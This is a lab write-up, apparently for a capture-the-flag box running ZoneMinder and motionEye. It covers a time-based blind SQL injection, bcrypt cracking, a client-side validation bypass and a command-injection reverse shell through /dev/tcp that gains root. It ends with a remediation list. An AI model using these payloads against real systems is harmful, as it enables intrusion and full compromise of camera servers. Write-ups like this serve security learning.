03

SQL Injection (removetag endpoint)

ZoneMinder 1.37.63 has a known time-based blind SQL injection in the request view's removetag action, via the tid parameter.

3.1 Confirm endpoint is reachable while authenticated

Grabbed the session cookie from the browser (ZMSESSID) and tested manually:

curl -s "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -H "Cookie: ZMSESSID=ng38k44ur7ivus6a9t0uge0u3g" \
  -v

Output:

< HTTP/1.1 200 OK
< Content-Type: application/json
{"result":"Ok","response":0}

Endpoint reachable and authenticated.

3.2 Build the sqlmap request file

cat > req.txt << 'EOF'
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
User-Agent: Mozilla/5.0
Cookie: ZMSESSID=ng38k44ur7ivus6a9t0uge0u3g; zmSkin=classic; zmCSS=base
Connection: close

EOF

3.3 Confirm injection with sqlmap

sqlmap -r req.txt -p tid --batch --technique=T

Key output:

[05:39:34] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 4617 FROM (SELECT(SLEEP(5)))zVMh)
back-end DBMS: MySQL >= 5.0.12

04

Cracking the mark Hash

4.1 Save the hash

echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > hash.txt

4.2 Crack with hashcat (mode 3200 = bcrypt)

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

At ~73 H/s (CPU-only, no GPU acceleration available), a full rockyou.txt run was estimated at 2+ days. Left it running briefly and it cracked quickly regardless, since the correct password appeared early in the list:

Output:

$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame

Session..........: hashcat
Status...........: Cracked
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Cracked credentials: mark : opensesame

Why this matteredbcrypt is slow to brute-force at scale, but a weak underlying password still falls fast against a small, well-known wordlist — hash strength doesn't compensate for a bad password choice.

08

Command Injection → Reverse Shell

8.1 Bypass client-side validation

Opened browser DevTools (F12) → Console, and ran:

configUiValid = function() {
    return true;
};

This override must be re-applied on every fresh page load/navigation — it does not persist across tab switches or reloads.

8.2 Verify injection point

In the camera config panel, under Still Images → Image File Name, entered:

$(touch /tmp/test).%Y-%m-%d-%H-%M-%S

Clicked Apply. Confirmed on the server side that the config actually saved:

cat /etc/motioneye/camera-1.conf | grep -i picture_filename
picture_filename $(touch /tmp/test).%Y-%m-%d-%H-%M-%S

8.3 Start a listener

nc -lvnp 4444

8.4 Set the reverse shell payload

Replaced the Image File Name field with:

$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/<kali vpn>/4444 0>&1\"')")

Clicked Apply.

Confirmed the config saved correctly:

cat /etc/motioneye/camera-1.conf | grep -i picture_filename
picture_filename $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/<kali vpn>/4444 0>&1\"')")

8.5 Trigger the payload

Applying the config alone does not execute the command — the filename template is only evaluated when a picture is actually captured. Triggered a manual snapshot via the motion control API:

curl -s "http://127.0.0.1:7999/1/action/snapshot"
Snapshot for camera 1
Done

8.6 Catch the shell

┌──(burrito㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [<kali vpn>] from (UNKNOWN) [<TARGET_IP>] 50180
bash: cannot set terminal process group (5085): Inappropriate ioctl for device
bash: no job control in this shell

The motion/motioneye service runs as root to access raw camera/video devices — the injected command executed with full root privileges immediately.

Why this matteredClient-side-only validation is not a security boundary — it's a UX nicety an attacker's browser console can simply remove. Every constraint on a field's contents has to be enforced again on the server.

11

Root Causes & Remediation

  • Default credentials left enabled on ZoneMinder (admin:admin) — should be forced to change on first login.
  • Unpatched ZoneMinder version (1.37.63) vulnerable to blind SQL injection in the removetag action — needs input sanitization / parameterized queries and prompt patching.
  • Weak user password (opensesame) crackable via a common wordlist in under 2 minutes — enforce password complexity policies.
  • Sensitive credentials stored in plaintext/hashed comments inside motion.conf, readable by a low-privilege local user — secrets should not be embedded in world-readable config files.
  • Client-side-only input validation in motionEye's configuration UI, trivially bypassed via browser DevTools — all validation must be enforced server-side.
  • Service running as root unnecessarily — motion/motioneye should run under a dedicated low-privilege service account with only the specific device permissions it needs (e.g., via udev rules/group membership), not full root.
